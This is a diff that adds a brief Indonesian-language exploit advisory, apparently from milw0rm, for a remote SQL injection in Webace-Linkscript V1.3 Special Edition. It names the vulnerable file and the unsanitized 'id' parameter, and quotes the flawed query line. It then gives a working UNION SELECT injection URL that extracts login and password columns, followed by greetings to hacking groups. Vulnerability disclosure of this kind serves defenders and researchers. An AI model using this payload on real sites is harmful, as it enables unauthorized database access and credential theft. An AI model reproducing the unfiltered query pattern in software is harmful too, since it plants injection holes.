@@ -1,0 +1,45 @@
+########################################################################
+# Webace-Linkscript V1.3 Special Edition - Remote SQL Injection
+# Vendor           : http://www.webace.de/
+# Download         : http://www.webace.de/downloads/wls_se.zip
+# Ditemukan oleh   : k1tk4t - k1tk4t[4t]newhack.org
+# Lokasi           : Indonesia  --  #newhack[dot]org @ irc.dal.net
+########################################################################
+Berkas;
+/go/rubrik.php
+
+Kutu pada baris-2;
+$rubrikname = mysql_fetch_array(mysql_query('SELECT name FROM wls_rubriken WHERE id='.$HTTP_GET_VARS['id']));
+
+Keterangan;
+$HTTP_GET_VARS['id'] tidak ter'filter' dengan baik, sehingga pengguna bisa memanipulasi SQL melalui browser
+
+POC;
+http://localhost/wls_v1.3se/start.php?go=rubrik&id=[SQL]
+
+Contoh;
+http://localhost/wls_v1.3se/start.php?go=rubrik&id=-1/**/union/**/select/**/null,null,null,null,null,null,null,null,login,passwort,null,null,null,null,null/**/from/**/wls_eintrag/*
+
+########################################################################
+Terimakasih untuk;
+str0ke, DNX
+xoron,iFX,x-ace,nyubi,arioo,selikoer,k1ngk0ng,aldy_BT,adhietslank
+dan semua temen2 komunitas security&hacking
+-----------------------
+-newhack[dot]org|staff-
+mR.opt1lc,fusion,fl3xu5,PusHm0v,Ghoz,bius,iind_id,slackX
+-----------------------
+all member newhack[dot]org
+-----------------------
+all member www.echo.or.id
+-----------------------
+all member www.yogyafree.net
+-----------------------
+all member www.sekuritionline.net
+-----------------------
+all member www.kecoak-elektronik.net
+-----------------------
+semua komunitas hacker&security Indonesia
+Cintailah Bahasa Indonesia
+
+# milw0rm.com [2007-09-07]
